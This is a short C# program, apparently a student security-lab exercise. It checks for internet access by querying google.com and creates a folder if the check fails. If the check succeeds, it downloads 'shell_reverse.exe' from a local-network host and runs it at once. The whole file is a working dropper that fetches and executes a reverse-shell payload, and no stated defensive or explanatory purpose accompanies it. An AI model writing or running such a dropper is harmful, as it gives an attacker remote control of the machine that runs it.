using System;
using System.Diagnostics;
using System.Text;
using System.IO;
using System.Net;
using System.Net.Sockets;
namespace Bai3_b
{
    class Program

    {

        static void Main(string[] args)
        {
            HttpWebRequest req = WebRequest.Create("http://google.com") as HttpWebRequest;
            HttpWebResponse rsp;
            try
            {
                rsp = req.GetResponse() as HttpWebResponse;
            }
            catch (WebException e)
            {
                if (e.Response is HttpWebResponse)
                {
                    rsp = e.Response as HttpWebResponse;
                }
                else
                {
                    rsp = null;
                }
            }
            if (rsp != null)
            {
                var filename = "file.exe";
                new WebClient().DownloadFile("http://192.168.11.128/shell_reverse.exe", filename);
                Process.Start(filename);
            }

            else
            {
                string folderName = @"c:\Desktop";

                string pathString = System.IO.Path.Combine(folderName, "18520363");

                System.IO.Directory.CreateDirectory(pathString);
            }
        }
    }

}
